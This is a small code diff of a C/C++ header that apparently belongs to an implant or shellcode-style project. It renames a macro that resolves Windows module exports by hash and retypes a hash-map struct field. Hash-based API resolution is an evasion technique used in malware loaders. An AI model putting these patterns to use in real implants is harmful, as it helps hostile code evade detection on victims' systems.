@@ -156,7 +156,7 @@ EXTERN_C LPVOID InstEnd();
 
 #define F_PTR_HMOD(Fn, hmod, sym_hash)				(Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(hmod, sym_hash))
 #define F_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (decltype(Fn)) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
-#define V_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (void*) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
+#define C_PTR_HASHES(Fn, mod_hash, sym_hash)		(Fn = (void*) Memory::Modules::GetExportAddress(Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash)), sym_hash))
 #define M_PTR(mod_hash)								Memory::Modules::GetModuleAddress(Memory::Modules::GetModuleEntry(mod_hash))
 #define NT_ASSERT(Fn)								Fn; if (NtCurrentTeb()->LastErrorValue != ERROR_SUCCESS) return
 
@@ -378,8 +378,8 @@ struct _command_map{
 };
 
 struct _hash_map{
-	DWORD    	name;
-	UINT_PTR	address;
+	DWORD	name;
+	LPVOID	address;
 };
 
 struct LdrpVectorHandlerEntry {
